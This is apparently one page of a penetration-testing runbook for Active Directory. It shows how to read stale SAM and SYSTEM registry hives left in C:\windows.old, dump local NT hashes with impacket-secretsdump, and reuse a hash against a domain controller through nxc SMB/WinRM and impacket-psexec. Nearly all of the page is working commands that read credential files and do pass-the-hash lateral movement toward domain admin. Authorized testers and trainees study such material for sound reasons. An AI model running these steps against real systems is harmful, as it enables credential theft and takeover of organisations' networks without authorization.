# AD - Stale Hive Credential Reuse (windows.old)

**Step 43B of 50 · AD**

*Read a readable C:\windows.old (or backup) SAM/SYSTEM to recover a local account hash, then reuse it if it matches a domain account.*

## When to use this page

Use this page when a low-privileged user (or a foothold account) can read files from `C:\windows.old\Windows\System32\config\` — typically `SAM` and `SYSTEM`. This occurs when an old Windows installation was left behind, or when a recovery image/backup directory is exposed.

## Find and inspect

> **Why:** A stale image often contains a local administrator account whose hash was never rotated. If that password is reused by a domain user, pass-the-hash becomes a direct path to DA.
```cmd
dir C:\windows.old\Windows\System32\config
type C:\windows.old\Windows\System32\config\SAM | findstr /i "tom_admin" 2>nul
type C:\windows.old\Windows\System32\config\SYSTEM | findstr /i "tom_admin" 2>nul
```

## Extract and parse the hives (Windows)

Save the hives and parse with Impacket. Run this from Kali if the local shell supports uploading; if you're on Windows, copy locally or parse as appropriate.

> **Why:** A Volume Shadow Copy is not required. Simply reading the raw hives and using `secretsdump.py LOCAL` decrypts the local account hashes from SAM/SYSTEM.
```bash
# If saved remotely or already on disk, copy and parse.
# From Windows (via a working shell), copy to loot first:
# copy C:\windows.old\Windows\System32\config\SAM C:\Windows\Temp\old-sam.hiv
# copy C:\windows.old\Windows\System32\config\SYSTEM C:\Windows\Temp\old-system.hiv

# Parse offline in Kali:
impacket-secretsdump -sam loot/old-sam.hiv -system loot/old-system.hiv LOCAL
```

## Reuse the recovered hash

Look for the relevant RID (often RID 500 for Administrator, or a named local admin). If the same NT hash belongs to a domain user (password reuse), pass-the-hash to domain targets.

> **Why:** Confirm the account's scope and status before proceeding. Start with SMB to confirm Pwn3d!.
```bash
# Try the recovered NT hash against domain/hosts
nxc smb $DCip -u tom_admin -H $NThash
nxc smb $BoxIP -u tom_admin -H $NThash
nxc winrm $DCip -u tom_admin -H $NThash  # if WinRM open
impacket-psexec $Domain/tom_admin@$DCip -hashes :$NThash
```

## Notes & safety

- Do not attempt to overwrite the stale hives. Only read/copy.
- Password reuse is a common issue — the NT hash from a stale local SAM can be the key to a domain account.
- Log the recovered RID, username, and hash path in the engagement (do **not** paste the full hash into this runbook).
- If the hash is only for a local account on the same host, it can still be useful for local admin access (subject to UAC/token filtering).
